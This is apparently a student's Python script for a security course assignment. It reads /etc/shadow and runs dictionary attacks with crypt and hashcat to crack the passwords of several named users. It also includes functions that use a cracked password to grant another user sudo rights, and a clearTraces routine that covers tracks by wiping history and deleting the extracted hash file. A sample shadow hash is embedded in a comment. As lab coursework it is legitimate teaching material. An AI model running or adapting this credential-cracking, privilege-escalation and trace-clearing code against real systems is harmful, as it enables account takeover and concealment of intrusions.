#! /usr/bin/env python3
## Tanner Hermann
## PA04 - funandgames.py
## Instructor: Dr. Patrick Taylor

import subprocess
import sys
import os
import crypt


def main():

	#tempworkerPW = "correctbatteryhorsestaple99"

	## 1. Get sysadmin pass using hashcat
	## 2. Use pwdCrack() function for 'yourboss' pwd
	## 3. Use pwdCrack() on 'yourbuddy' user
	## 4. Add sudo permissions to tempworker
	## 5. Fix permissions on shadow file using fixPermissions()
	## 6. Clear traces using clearTraces()

	## Possible wordlists
	#/usr/share/wordlists/dirb/big.txt
	#/usr/share/wordlists/rockyou.txt

	adminPass = pwdCrack("sysadmin", "/usr/share/wordlists/dirb/big.txt")
	bossPwd = pwdCrack("yourboss", "/usr/share/wordlists/dirb/big.txt")
	#yourbuddyPass = pwdCrack("yourbuddy", "/usr/share/wordlists/dirb/big.txt")
	yourbuddyPass = hashCrack("yourbuddy")


	
	## Give sudo priviledges to "tempworker"
	#addSudoer("sysadmin", adminPass, "tempworker")

	#fixPermissions("sysadmin", adminPass)

	## Clear all traces
	clearTraces()

	## OUTPUT ##
	print(bossPwd)
	print(yourbuddyPass)
	print(adminPass)
	############

	return


##### Get pwd for yourboss ######
def pwdCrack(username, wordlistf):

	## Get password line from /etc/shadow and send only that user's line to passwordFile.txt 
	passwordLocation = open('/etc/shadow', "r")
	getHash(username, passwordLocation)
	passwordLocation.close()

	passwordFile = open('passwordFile.txt', "r")
	maskedPwd = ''
	## Get rid of username at the beginning of the shadowfile
	maskedPwd = passwordFile.read().strip(username + ':')
	passwordFile.close()

	hashLen = 0
	saltLen = 0

	#hashingType = maskedPwd[0:2]
	

	## For loop to find the length of salt and hashed password
	for i in range(len(maskedPwd)):
		## The salt extends from after the username to the last '$' character
		if maskedPwd[i] == '$':
			saltLen = i

		## The hashed password includes the salt and extends until a ':' character
		if (maskedPwd[i] == ':' and hashLen == 0):
			hashLen = i


	#salt_no_hash_type = maskedPwd[2:saltLen]
	salt = maskedPwd[:saltLen]
	#print(salt)
	hashedPwd = maskedPwd[:hashLen]
	#print(hashedPwd)

	## 'yourboss' actual salt and hashed password for testing
	#salt = '$6$dbkKuKGS'
	#hashedPwd = '$6$dbkKuKGS$XsniIqjOF39Kar2w3vZ8DuImkBihLJ0wR6skCAzwIFTDfbDdgQLYCyzRrcQeouT83didVrrOiXVYVARDpX88L/'


	wordlist = open(wordlistf,"r", encoding="ISO-8859-1")

	for word in wordlist.readlines():
		word = word.strip('\n')
		crypted_word = crypt.crypt(word,salt)
		if crypted_word == hashedPwd:
			## Passwd has been found, close wordlist and exit function
			wordlist.close()
			return(word)

	## If the password does not match any from the wordlist the function will return a password value of "not cracked"
	return("not cracked")




##### Fix Permissions for /etc/shadow #####
def fixPermissions(sudoUser, sudoPW):

	## fix permissions on shadow file
	## Set permissions on /etc/shadow to default of (600 or 640)?
	
	command = f"su {sudoUser} -c \"echo {sudoPW} | sudo -S chmod 600 /etc/shadow\""
	result = subprocess.run(command, stdout=subprocess.PIPE, universal_newlines=True, input=sudoPW, stderr=subprocess.STDOUT, shell=True)
	#result = subprocess.call(command)
	print(result.stdout)

	return



#### Give sudo priviledges to another user ####
#### input for user must have sudo priviledges. ####
def addSudoer(user, pw, newUser):
	command = f"su {user} -c \"echo {pw} | sudo -S usermod -a -G sudo {newUser}\""
	#subprocess.run(command, stdout=subprocess.PIPE, universal_newlines=True, input=pw, stderr=subprocess.STDOUT, shell=True)
	subprocess.call(command)
	return




##### Clear tracks #####
def clearTraces():

	## Clear bash history
	subprocess.run(['reset'])
	#subprocess.call(['rm', os.path.expanduser('~/.bash_history')])
	#command = "cat /dev/null > ~/.bash_history && history -c"
	#subprocess.call(command)

	## Remove password file
	subprocess.run(['rm', 'passwordFile.txt'])

	return



#### Get hashed line from /etc/shadow and prints only a specific user's line to passwordFile.txt#####
def getHash(user, pwdFile):
	for line in pwdFile:
		if (user in line):
			passwordFile = open('passwordFile.txt', "w")
			passwordFile.write(line)
			passwordFile.close()
			


#### Use hashcat to crack password of inputed user ####
def hashCrack(user):

	command = "hashcat -m1800 --outfile-format=2 passwordFile.txt /usr/share/wordlists/dirb/big.txt --force --show"

	## These commands are to use john instead of hashcat
	#firstJohn = "~/usr/sbin/john passwordFile.txt"
	#secondJohn = "~/usr/sbin/john --show passwordFile.txt"

	with open('/etc/shadow', "r") as pwdFile:
		getHash(user, pwdFile)
		userPwd = subprocess.getoutput(command)

		## vv For john instead of hashcat
		#subprocess.run(firstJohn)
		#userPwd = subprocess.getoutput(secondJohn)
		
		pwdFile.close()
		return (userPwd)



if __name__ == '__main__':
    main()
